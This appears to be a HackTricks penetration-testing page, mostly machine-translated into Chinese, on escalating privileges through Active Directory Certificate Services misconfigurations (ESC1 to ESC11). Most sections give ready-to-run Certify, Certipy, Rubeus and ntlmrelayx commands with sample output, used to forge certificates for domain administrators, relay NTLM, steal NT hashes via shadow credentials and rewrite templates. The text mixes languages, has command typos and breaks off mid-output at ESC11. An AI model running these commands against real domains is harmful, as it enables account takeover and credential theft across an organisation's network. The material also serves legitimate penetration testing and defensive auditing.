# AD CS Domain Escalation

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**这是对帖子中升级技术部分的总结：**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### Explanation

### Misconfigured Certificate Templates - ESC1 Explained

* **企业 CA 授予低权限用户注册权。**
* **不需要经理批准。**
* **不需要授权人员的签名。**
* **证书模板上的安全描述符过于宽松，允许低权限用户获得注册权。**
* **证书模板配置为定义促进身份验证的 EKU：**
* 包含客户端身份验证 (OID 1.3.6.1.5.5.7.3.2)、PKINIT 客户端身份验证 (1.3.6.1.5.2.3.4)、智能卡登录 (OID 1.3.6.1.4.1.311.20.2.2)、任何目的 (OID 2.5.29.37.0) 或无 EKU (SubCA) 等扩展密钥使用 (EKU) 标识符。
* **模板允许请求者在证书签名请求 (CSR) 中包含 subjectAltName：**
* 如果存在，Active Directory (AD) 在证书中优先考虑 subjectAltName (SAN) 进行身份验证。这意味着通过在 CSR 中指定 SAN，可以请求证书以冒充任何用户（例如，域管理员）。请求者是否可以指定 SAN 在证书模板的 AD 对象中通过 `mspki-certificate-name-flag` 属性指示。该属性是一个位掩码，存在 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志允许请求者指定 SAN。

{% hint style="danger" %}
上述配置允许低权限用户请求具有任何选择的 SAN 的证书，从而通过 Kerberos 或 SChannel 作为任何域主体进行身份验证。
{% endhint %}

此功能有时被启用以支持产品或部署服务的 HTTPS 或主机证书的即时生成，或由于缺乏理解。

需要注意的是，使用此选项创建证书会触发警告，而当复制现有证书模板（例如，启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 的 `WebServer` 模板）并修改以包含身份验证 OID 时则不会。

### Abuse

要**查找易受攻击的证书模板**，您可以运行：
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
要**利用此漏洞冒充管理员**，可以运行：
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
然后您可以将生成的 **证书转换为 `.pfx`** 格式，并再次使用 **Rubeus 或 certipy** 进行 **身份验证**：
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
The Windows binaries "Certreq.exe" & "Certutil.exe" 可以用来生成 PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

在 AD Forest 的配置架构中枚举证书模板，特别是那些不需要批准或签名、具有客户端身份验证或智能卡登录 EKU，并且启用了 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 标志的，可以通过运行以下 LDAP 查询来执行：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Misconfigured Certificate Templates - ESC2

### Explanation

第二个滥用场景是第一个场景的变体：

1. 企业 CA 授予低权限用户注册权限。
2. 禁用经理批准的要求。
3. 省略授权签名的需要。
4. 证书模板上的安全描述符过于宽松，授予低权限用户证书注册权限。
5. **证书模板被定义为包含任何目的 EKU 或没有 EKU。**

**任何目的 EKU** 允许攻击者为 **任何目的** 获取证书，包括客户端身份验证、服务器身份验证、代码签名等。可以使用与 **ESC3** 相同的 **技术** 来利用此场景。

具有 **无 EKU** 的证书，作为下级 CA 证书，可以被用于 **任何目的**，并且 **也可以用来签署新证书**。因此，攻击者可以利用下级 CA 证书指定任意 EKU 或字段在新证书中。

然而，如果下级 CA 未被 **`NTAuthCertificates`** 对象信任（这是默认设置），则为 **域身份验证** 创建的新证书将无法正常工作。尽管如此，攻击者仍然可以创建 **具有任何 EKU** 和任意证书值的新证书。这些证书可能会被 **滥用** 用于广泛的目的（例如，代码签名、服务器身份验证等），并可能对网络中其他应用程序（如 SAML、AD FS 或 IPSec）产生重大影响。

要枚举与此场景匹配的模板，可以运行以下 LDAP 查询：
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

这个场景与第一个和第二个场景类似，但**利用**了**不同的 EKU**（证书请求代理）和**两个不同的模板**（因此有两组要求），

**证书请求代理 EKU**（OID 1.3.6.1.4.1.311.20.2.1），在 Microsoft 文档中称为**注册代理**，允许一个主体**代表另一个用户**进行**证书注册**。

**“注册代理”**在这样的**模板**中注册，并使用生成的**证书代表其他用户共同签署 CSR**。然后，它将**共同签署的 CSR**发送到 CA，注册一个**允许“代表注册”的模板**，CA 返回一个**属于“其他”用户的证书**。

**Requirements 1:**

* 企业 CA 授予低权限用户注册权。
* 省略了经理批准的要求。
* 没有授权签名的要求。
* 证书模板的安全描述符过于宽松，授予低权限用户注册权。
* 证书模板包括证书请求代理 EKU，允许代表其他主体请求其他证书模板。

**Requirements 2:**

* 企业 CA 授予低权限用户注册权。
* 经理批准被绕过。
* 模板的架构版本为 1 或超过 2，并指定了需要证书请求代理 EKU 的应用程序策略发行要求。
* 证书模板中定义的 EKU 允许域身份验证。
* CA 上未对注册代理应用限制。

### Abuse

您可以使用 [**Certify**](https://github.com/GhostPack/Certify) 或 [**Certipy**](https://github.com/ly4k/Certipy) 来利用此场景：
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **用户** who are allowed to **获取** an **注册代理证书**, the templates in which enrollment **代理** are permitted to enroll, and the **账户** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **管理单元**, **右键点击 CA**, **点击属性**, and then **导航** to the “Enrollment Agents” tab.

However, it is noted that the **默认** setting for CAs is to “**不限制注册代理**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **所有人** access to enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **解释**

The **安全描述符** on **证书模板** defines the **权限** specific **AD 实体** possess concerning the template.

Should an **攻击者** possess the requisite **权限** to **更改** a **模板** and **建立** any **可利用的错误配置** outlined in **之前的部分**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

* **所有者:** Grants implicit control over the object, allowing for the modification of any attributes.
* **完全控制:** Enables complete authority over the object, including the capability to alter any attributes.
* **写入所有者:** Permits the alteration of the object's owner to a principal under the attacker's control.
* **写入 DACL:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
* **写入属性:** Authorizes the editing of any object properties.

### 滥用

An example of a privesc like the previous one:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** 可以通过一个命令覆盖证书模板的配置。默认情况下，Certipy 将覆盖配置，使其对 ESC1 **易受攻击**。我们还可以指定 **`-save-old` 参数以保存旧配置**，这在我们攻击后 **恢复** 配置时将非常有用。
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Explanation

广泛的基于ACL的关系网络，包括证书模板和证书颁发机构之外的多个对象，可能会影响整个AD CS系统的安全性。这些对象可能显著影响安全性，包括：

* CA服务器的AD计算机对象，可能通过S4U2Self或S4U2Proxy等机制被攻陷。
* CA服务器的RPC/DCOM服务器。
* 在特定容器路径`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`内的任何后代AD对象或容器。该路径包括但不限于证书模板容器、认证机构容器、NTAuthCertificates对象和注册服务容器等容器和对象。

如果低权限攻击者设法控制这些关键组件中的任何一个，PKI系统的安全性可能会受到威胁。

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explanation

在[**CQure Academy帖子**](https://cqureacademy.com/blog/enhanced-key-usage)中讨论的主题也涉及**`EDITF_ATTRIBUTESUBJECTALTNAME2`**标志的影响，如微软所述。当在认证机构（CA）上激活此配置时，允许在**任何请求**的**主题备用名称**中包含**用户定义的值**，包括那些由Active Directory®构建的请求。因此，这一条款允许**入侵者**通过为域**认证**设置的**任何模板**进行注册——特别是那些对**无特权**用户注册开放的模板，如标准用户模板。结果，证书可以被获取，使入侵者能够作为域管理员或**域内的任何其他活动实体**进行身份验证。

**注意**：通过`certreq.exe`中的`-attrib "SAN:"`参数将**备用名称**附加到证书签名请求（CSR）的方法（称为“名称值对”）与ESC1中SAN的利用策略存在**对比**。在这里，区别在于**账户信息的封装方式**——在证书属性中，而不是扩展中。

### Abuse

要验证该设置是否已激活，组织可以使用以下命令与`certutil.exe`：
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
此操作本质上使用 **远程注册表访问**，因此，另一种方法可能是：
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
像 [**Certify**](https://github.com/GhostPack/Certify) 和 [**Certipy**](https://github.com/ly4k/Certipy) 这样的工具能够检测到这种错误配置并加以利用：
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
要更改这些设置，假设拥有**域管理员**权限或同等权限，可以从任何工作站执行以下命令：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
要在您的环境中禁用此配置，可以使用以下命令删除标志：
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
在2022年5月的安全更新之后，新发行的**证书**将包含一个**安全扩展**，该扩展包含**请求者的 `objectSid` 属性**。对于ESC1，此SID源自指定的SAN。然而，对于**ESC6**，SID反映**请求者的 `objectSid`**，而不是SAN。\
要利用ESC6，系统必须易受ESC10（弱证书映射）的影响，该漏洞优先考虑**SAN而不是新的安全扩展**。
{% endhint %}

## 易受攻击的证书颁发机构访问控制 - ESC7

### 攻击 1

#### 解释

证书颁发机构的访问控制通过一组权限来维护，这些权限管理CA的操作。可以通过访问`certsrv.msc`，右键单击CA，选择属性，然后导航到安全选项卡来查看这些权限。此外，可以使用PSPKI模块和以下命令枚举权限：
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
这提供了对主要权限的洞察，即 **`ManageCA`** 和 **`ManageCertificates`**，分别与“CA管理员”和“证书管理器”的角色相关。

#### 滥用

在证书颁发机构拥有 **`ManageCA`** 权限使得主体能够使用 PSPKI 远程操控设置。这包括切换 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 标志，以允许在任何模板中指定 SAN，这是域提升的一个关键方面。

通过使用 PSPKI 的 **Enable-PolicyModuleFlag** cmdlet，可以简化此过程，允许在不直接与 GUI 交互的情况下进行修改。

拥有 **`ManageCertificates`** 权限可以促进对待处理请求的批准，有效地绕过“CA 证书管理器批准”保护措施。

可以结合 **Certify** 和 **PSPKI** 模块来请求、批准和下载证书：
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
在**之前的攻击**中，**`Manage CA`** 权限被用来**启用** **EDITF\_ATTRIBUTESUBJECTALTNAME2** 标志以执行 **ESC6 攻击**，但这在 CA 服务（`CertSvc`）重启之前不会产生任何效果。当用户拥有 `Manage CA` 访问权限时，用户也被允许**重启服务**。然而，这**并不意味着用户可以远程重启服务**。此外，由于 2022 年 5 月的安全更新，**ESC6 可能在大多数已修补的环境中无法正常工作**。
{% endhint %}

因此，这里提出了另一个攻击。

前提条件：

* 仅有 **`ManageCA` 权限**
* **`Manage Certificates`** 权限（可以从 **`ManageCA`** 授予）
* 证书模板 **`SubCA`** 必须**启用**（可以从 **`ManageCA`** 启用）

该技术依赖于拥有 `Manage CA` _和_ `Manage Certificates` 访问权限的用户可以**发出失败的证书请求**。**`SubCA`** 证书模板**易受 ESC1 攻击**，但**只有管理员**可以注册该模板。因此，**用户**可以**请求**注册 **`SubCA`** - 这将被**拒绝** - 但**随后由管理员发放**。

#### Abuse

您可以通过将自己添加为新官员来**授予自己 `Manage Certificates`** 访问权限。
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 模板可以通过 `-enable-template` 参数在 CA 上 **启用**。默认情况下，`SubCA` 模板是启用的。
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
如果我们满足了此攻击的先决条件，我们可以开始**请求基于 `SubCA` 模板的证书**。

**此请求将被拒绝**，但我们将保存私钥并记录请求 ID。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
通过我们的 **`Manage CA` 和 `Manage Certificates`**，我们可以使用 `ca` 命令和 `-issue-request <request ID>` 参数 **发放失败的证书** 请求。
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
最后，我们可以使用 `req` 命令和 `-retrieve <request ID>` 参数**检索已发放的证书**。
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 解释

{% hint style="info" %}
在**安装了AD CS**的环境中，如果存在**易受攻击的Web注册端点**，并且至少有一个**发布的证书模板**允许**域计算机注册和客户端身份验证**（例如默认的**`Machine`**模板），那么**任何具有活动的spooler服务的计算机都可能被攻击者攻陷**！
{% endhint %}

AD CS支持几种**基于HTTP的注册方法**，这些方法通过管理员可以安装的额外服务器角色提供。这些用于基于HTTP的证书注册的接口易受**NTLM中继攻击**。攻击者可以从**被攻陷的机器上，冒充任何通过入站NTLM进行身份验证的AD账户**。在冒充受害者账户的同时，攻击者可以访问这些Web接口，以**使用`User`或`Machine`证书模板请求客户端身份验证证书**。

* **Web注册接口**（可在`http://<caserver>/certsrv/`访问的旧ASP应用程序）默认仅支持HTTP，这并不提供对NTLM中继攻击的保护。此外，它明确仅允许通过其Authorization HTTP头进行NTLM身份验证，使得更安全的身份验证方法如Kerberos不适用。
* **证书注册服务**（CES）、**证书注册策略**（CEP）Web服务和**网络设备注册服务**（NDES）默认通过其Authorization HTTP头支持协商身份验证。协商身份验证**同时支持**Kerberos和**NTLM**，允许攻击者在中继攻击期间**降级为NTLM**身份验证。尽管这些Web服务默认启用HTTPS，但仅靠HTTPS**并不能保护免受NTLM中继攻击**。HTTPS服务的NTLM中继攻击保护只有在HTTPS与通道绑定结合时才能实现。遗憾的是，AD CS没有在IIS上启用身份验证的扩展保护，这是通道绑定所需的。

NTLM中继攻击的一个常见**问题**是**NTLM会话的短暂持续时间**以及攻击者无法与**需要NTLM签名**的服务进行交互。

然而，这一限制可以通过利用NTLM中继攻击为用户获取证书来克服，因为证书的有效期决定了会话的持续时间，并且该证书可以与**要求NTLM签名**的服务一起使用。有关如何使用被盗证书的说明，请参见：

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM中继攻击的另一个限制是**攻击者控制的机器必须由受害者账户进行身份验证**。攻击者可以选择等待或尝试**强制**进行此身份验证：

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **滥用**

[**Certify**](https://github.com/GhostPack/Certify)的`cas`枚举**启用的HTTP AD CS端点**：
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 属性被企业证书授权机构 (CAs) 用于存储证书注册服务 (CES) 端点。可以通过利用工具 **Certutil.exe** 解析和列出这些端点：
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### 利用 Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

默认情况下，Certipy 根据模板 `Machine` 或 `User` 发出证书请求，这取决于被中继的帐户名称是否以 `$` 结尾。可以通过使用 `-template` 参数来指定替代模板。

然后可以使用像 [PetitPotam](https://github.com/ly4k/PetitPotam) 这样的技术来强制身份验证。在处理域控制器时，需要指定 `-template DomainController`。
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

新的值 **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) 对于 **`msPKI-Enrollment-Flag`**，称为 ESC9，防止在证书中嵌入 **新的 `szOID_NTDS_CA_SECURITY_EXT` 安全扩展**。当 `StrongCertificateBindingEnforcement` 设置为 `1`（默认设置）时，该标志变得相关，这与设置为 `2` 相对。在可能被利用的情况下，ESC9 的相关性在于较弱的 Kerberos 或 Schannel 证书映射（如 ESC10）可能被利用，因为缺少 ESC9 不会改变要求。

该标志设置变得重要的条件包括：

* `StrongCertificateBindingEnforcement` 未调整为 `2`（默认为 `1`），或 `CertificateMappingMethods` 包含 `UPN` 标志。
* 证书在 `msPKI-Enrollment-Flag` 设置中标记为 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。
* 证书指定了任何客户端身份验证 EKU。
* 对任何帐户具有 `GenericWrite` 权限以妥协另一个帐户。

### Abuse Scenario

假设 `John@corp.local` 对 `Jane@corp.local` 拥有 `GenericWrite` 权限，目标是妥协 `Administrator@corp.local`。`Jane@corp.local` 被允许注册的 `ESC9` 证书模板在其 `msPKI-Enrollment-Flag` 设置中配置了 `CT_FLAG_NO_SECURITY_EXTENSION` 标志。

最初，使用 Shadow Credentials 获取 `Jane` 的哈希，得益于 `John` 的 `GenericWrite`：
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
随后，`Jane`的`userPrincipalName`被修改为`Administrator`，故意省略了`@corp.local`域部分：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
此修改不违反约束，因为 `Administrator@corp.local` 仍然作为 `Administrator` 的 `userPrincipalName` 而保持独特。

接下来，标记为易受攻击的 `ESC9` 证书模板被请求为 `Jane`：
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
注意到证书的 `userPrincipalName` 反映了 `Administrator`，没有任何“对象 SID”。

`Jane` 的 `userPrincipalName` 随后恢复为她的原始值 `Jane@corp.local`：
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
尝试使用颁发的证书进行身份验证现在会产生 `Administrator@corp.local` 的 NT 哈希。由于证书缺乏域规范，命令必须包括 `-domain <domain>`：
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## 弱证书映射 - ESC10

### 解释

域控制器上的两个注册表键值被ESC10引用：

* `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel`下的`CertificateMappingMethods`的默认值为`0x18`（`0x8 | 0x10`），之前设置为`0x1F`。
* `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc`下的`StrongCertificateBindingEnforcement`的默认设置为`1`，之前为`0`。

**案例 1**

当`StrongCertificateBindingEnforcement`配置为`0`时。

**案例 2**

如果`CertificateMappingMethods`包含`UPN`位（`0x4`）。

### 滥用案例 1

当`StrongCertificateBindingEnforcement`配置为`0`时，具有`GenericWrite`权限的账户A可以被利用来妥协任何账户B。

例如，拥有对`Jane@corp.local`的`GenericWrite`权限，攻击者旨在妥协`Administrator@corp.local`。该过程与ESC9相似，允许使用任何证书模板。

最初，使用Shadow Credentials检索`Jane`的哈希，利用`GenericWrite`。
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
随后，`Jane`的`userPrincipalName`被更改为`Administrator`，故意省略`@corp.local`部分以避免约束冲突。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
接下来，作为 `Jane` 请求一个启用客户端身份验证的证书，使用默认的 `User` 模板。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`的`userPrincipalName`随后被恢复为其原始值，`Jane@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
使用获得的证书进行身份验证将产生 `Administrator@corp.local` 的 NT 哈希，因此由于证书中缺少域详细信息，命令中需要指定域。
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

当 `CertificateMappingMethods` 包含 `UPN` 位标志 (`0x4`) 时，具有 `GenericWrite` 权限的账户 A 可以破坏任何缺少 `userPrincipalName` 属性的账户 B，包括机器账户和内置域管理员 `Administrator`。

在这里，目标是破坏 `DC$@corp.local`，首先通过 Shadow Credentials 获取 `Jane` 的哈希，利用 `GenericWrite`。
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`的`userPrincipalName`被设置为`DC$@corp.local`。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
请求一个用于客户端身份验证的证书，作为 `Jane` 使用默认的 `User` 模板。
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`的`userPrincipalName`在此过程后恢复为其原始值。
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
通过 Schannel 进行身份验证时，使用 Certipy 的 `-ldap-shell` 选项，身份验证成功的指示为 `u:CORP\DC$`。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
通过LDAP shell，命令如`set_rbcd`启用基于资源的受限委派（RBCD）攻击，可能会危及域控制器。
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
此漏洞还扩展到任何缺少 `userPrincipalName` 的用户帐户，或其与 `sAMAccountName` 不匹配的帐户，默认的 `Administrator@corp.local` 是一个主要目标，因为它具有提升的 LDAP 权限，并且默认情况下缺少 `userPrincipalName`。

## Relaying NTLM to ICPR - ESC11

### Explanation

如果 CA 服务器未配置 `IF_ENFORCEENCRYPTICERTREQUEST`，则可以通过 RPC 服务进行未签名的 NTLM 中继攻击。[参考链接](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)。

您可以使用 `certipy` 来枚举 `Enforce Encryption for Requests` 是否被禁用，certipy 将显示 `ESC11` 漏洞。
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### 滥用场景

需要设置一个中继服务器：
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
